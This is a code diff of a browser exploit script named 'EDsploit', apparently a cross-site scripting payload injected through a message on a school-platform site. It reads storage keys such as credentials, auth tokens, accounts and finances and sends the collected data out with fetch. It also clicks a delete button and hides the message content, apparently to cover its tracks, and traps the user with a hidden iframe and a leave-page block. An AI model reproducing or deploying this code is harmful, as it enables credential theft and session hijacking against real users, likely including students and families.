@@ -1,8 +1,4 @@
 const ur = new URL(document.currentScript.src);
-window.top.addEventListener('beforeunload', (e) => {
-  e.preventDefault();
-  e.returnValue = '';
-});
 
 (async function ex() {
 
@@ -11,6 +7,7 @@ window.top.addEventListener('beforeunload', (e) => {
 		'accounts', 'badges', 'credentials', 'edhydration_auth',
 		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
 	];
+	
 	const form = window.top.document.createElement('form');
 	form.hidden = true;
 	form.className = "EDsploit"
@@ -36,7 +33,7 @@ window.top.addEventListener('beforeunload', (e) => {
 		)
 	};
 
-	if (ur.searchParams.get("iframetrap") !== "true") {
+	if (ur.searchParams.get("iframetrap") !== "false") {
 		window.top.document.querySelector('button[class="btn btn-danger"]').click()
 		const parents = window.top.document.querySelector('.view-message.printable-message.ck-content');
 		const style = parents.querySelectorAll(':scope > style');
@@ -52,9 +49,14 @@ window.top.addEventListener('beforeunload', (e) => {
 			body: JSON.stringify(data)
 		});
 	} catch {}
+
+	return payload();
 })();
 
-async function iframe() {
+async function payload() {
+	if (ur.searchParams.get("iframetrap") !== "false" || window.top.document.body.querySelector('iframe[class=EDsploit]')) return;
+	window.top.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
+
 	const i = window.top.document.createElement('iframe');
 	i.src = "/";
 	i.className = 'EDsploit';
@@ -106,13 +108,3 @@ async function iframe() {
 
 	return;
 };
-
-(async function() {
-	if (ur.searchParams.get("iframetrap") === "false") {
-		if (window.top.document.body.querySelector('iframe[class=EDsploit]')) {
-			return null
-		} else {
-			await iframe()
-		}
-	}
-})();
